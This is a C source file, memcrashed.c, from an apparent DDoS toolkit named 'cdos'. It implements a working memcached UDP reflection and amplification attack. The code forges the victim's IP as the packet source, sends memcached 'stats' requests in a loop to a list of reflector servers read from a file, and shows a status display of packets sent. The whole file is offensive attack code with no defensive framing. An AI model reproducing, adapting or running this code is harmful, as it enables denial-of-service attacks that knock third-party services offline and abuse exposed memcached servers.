//
//  memcrashed.c
//  cdos
//
//  Created by Andre Zay on 06.04.2018.
//  Copyright © 2018 Andre Zay. All rights reserved.
//

#include "memcrashed.h"
#include "socket.h"
#include "ddos.h"//configuration
#include "message.h"
#include "util.h"

#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <math.h>//pow
#include <stdint.h>

#ifdef __APPLE__
#define iphdr ip
#define MEMCRASHED_INCLUDED
#warning Memcrahsed may not work on latest versions of OS X due to raw socket limitations.
#endif

#define MAX_PSIZE 4096
slist* _hosts;
int _iid;
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum = 0;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}
#ifdef MEMCRASHED_INCLUDED
void init_ip(struct iphdr* iph,char* target){
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
    iph->ip_id = htonl(_iid++);
    iph->ip_off = 0;
    iph->ip_ttl = MAXTTL;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0;
    struct in_addr s;
    s.s_addr=inet_addr(target);
    iph->ip_src = s;
}

void init_udp(struct udphdr *udph,int port){//port--target port
    udph->uh_sport=htons(port);
    udph->uh_dport=htons(11211);//memcached port
    udph->uh_sum=0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", 15);
    udph->uh_ulen=htons(sizeof(struct udphdr) + 15);
}
void _memcrashed_ddos(char *target,int port,slist *hosts){
    char datagram[MAX_PSIZE];
    struct iphdr *iph = (struct iphdr*)datagram;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    int sock = dos_raw_sock(IPPROTO_TCP, false);
    if(sock < 0){
        die("Failed to open socket!");
    }
    memset(datagram, 0, MAX_PSIZE);
    init_rand((uint32_t)time(NULL));
    init_ip(iph, target);
    init_udp(udph, port);
    udph->uh_sport=randport();
    _node* cur=nth_slist(hosts,randrange(0, (int)hosts->length));
    while (__run){//launch attack
        char* __ip=cur->val;
        in_addr_t _ip=inet_addr(__ip);
        struct sockaddr_in t;
        t.sin_family=AF_INET;
        t.sin_addr.s_addr=_ip;
        if(sendto(sock, datagram, iph->ip_len, 0, (struct sockaddr *) &t, sizeof(t))==-1){
            dperror("Failed to send packet");
        }

        cur=cur->next;
        struct in_addr _t;
        _t.s_addr=inet_addr(cur->val);

        iph->ip_dst=_t;
        iph->ip_id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
        psent+=1;
        if(dos_sleep>0){
            sleep_ms(dos_sleep);
        }
    }
    //free(target);
    //free_slist(hosts);
}
#else
void _memcrashed_ddos(char *target,int port,slist *hosts){
    
}
void init_udp(struct udphdr *udph,int port){
    
}
void init_ip(struct iphdr* iph,char* target){

}
#endif
#ifdef MEMCRASHED_INCLUDED
void memcrashed_init(const char* hostfile){
    FILE* fp=fopen(hostfile, "r");
    if(!fp){
        die("Failed to open file:%s:%s(%d)",hostfile,strerror(errno),errno);
    }
    _hosts=create_slist();
    char *line = NULL;
    size_t len = 0;
    ssize_t read;
    while ((read = getline(&line, &len, fp)) != -1) {
        add_slist(_hosts, line);
    }
    if(line){
        free(line);
    }
}
#else
void memcrashed_init(const char* hostfile){
     die("Memcrashed is not included in this build.");
}
#endif
#ifdef MEMCRASHED_INCLUDED
void memcrashed_ddos(_dos_param* _p){//wrapper
    assert(_p->mode==MODE_MEMCRASHED);
    if(!_hosts){
        die("Programming error:variable _hosts unitiallized here!(%s:%d)",__FILE__,__LINE__);
    }
    _memcrashed_ddos(_p->host, _p->port, _hosts);
}
#else
void memcrashed_ddos(_dos_param* _p){//wrapper
   
}
#endif
#ifdef MEMCRASHED_INCLUDED
void memcrashed_status(void){
    success("Status:");
    success("Hit ^C to exit");
    const char * metrics_str=metrics2str(metrics);
    for (;;) {
        if (!__run) {
            break;
        }
        success_n("Total packets sent to memcached servers:%.2f%s\r",psent,metrics_str);
        psent+=MAX_PSIZE/pow(1024.0,metrics);
    }
}
#else
void memcrashed_status(void){
    die("Memcrashed is not included in current build.");
}
#endif
